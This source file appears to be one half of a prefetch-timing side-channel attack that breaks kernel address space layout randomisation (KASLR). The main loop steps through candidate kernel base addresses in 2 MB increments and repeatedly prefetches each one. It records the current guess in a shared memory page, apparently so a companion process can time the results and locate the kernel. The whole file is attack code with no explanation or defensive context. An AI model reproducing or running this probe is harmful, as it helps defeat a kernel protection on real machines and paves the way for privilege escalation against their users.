#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <emmintrin.h>
#include <smmintrin.h>
#include <string.h> 

#define OK        ( 0)
#define OPEN_FAIL (-1)
#define READ_FAIL (-2)
#define PARAM_ERR (-3)
#define KASLR_OFFSET 0xffff98c7c0000000 
#define DEFAULT_PHYSICAL_OFFSET (0xffffffff80800000ull)
#define STEP_86_64 (0x200000ull)
#define PAGE_SIZE (1<<12)
#define TRY_KADDR (1<<9)
#define TRY_KASLR_NUM   (1<<17)
#define TEST_NUM_INDEX  (0x1FF)
#define MB              (0x100000)
#define PRE_IDLE        (0xDEADBEEF)
#define AFTER_IDLE      (0xC001C0DE)

int __attribute__((optimize("-Os"), noinline)) read_prefetch(uint64_t kbase_addr, uint64_t ubase_addr, uint64_t read_op) {
  
  int64_t value = -1;
  long long int* uptr = reinterpret_cast<long long int*>(ubase_addr);
  __m128i* kptr = reinterpret_cast<__m128i*>(kbase_addr);
  
  kbase_addr = kbase_addr & ~((uint64_t)(PAGE_SIZE - 1));
  
  while (read_op--) {
    for(uint64_t i = 0; i < 64; i++) {
      
      for(uint64_t j = 0; j < 8; j++){
        _mm_stream_si64(&uptr[j], value);
      }
    
      for(uint64_t j = 0; j < 64; j++){
        _mm_prefetch((char*)(&kptr[0]), (_mm_hint)0);
      }
    }
  }
  return 0;
  
}

//----------main--------------
int main(int argc, char *argv[]) {
  
  char*    shm_fd       = argv[1];
  int fd = strtoul(shm_fd, NULL, 10);
  
  long long int* ptr = (long long int*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (ptr == (long long int*)MAP_FAILED){
    printf("\x1b[31;1m[*]\x1b[0m mmap failed.\n"); fflush(stdout);
    return -1;
  }
  uint64_t ubase = reinterpret_cast<uint64_t>(ptr);
  
  uint64_t offset = DEFAULT_PHYSICAL_OFFSET;
  uint64_t step   = 0;
 
  uint64_t counter = TRY_KADDR;
  ptr[TEST_NUM_INDEX] = PRE_IDLE;
  uint64_t kbase = offset + step;
  
  sleep(6);
  
  while (counter--) {
    ptr[TEST_NUM_INDEX] = kbase;
    read_prefetch(kbase, ubase, TRY_KASLR_NUM);
    step += STEP_86_64;
    kbase = offset + step;
  }
  ptr[TEST_NUM_INDEX] = AFTER_IDLE;
  return 0;
}
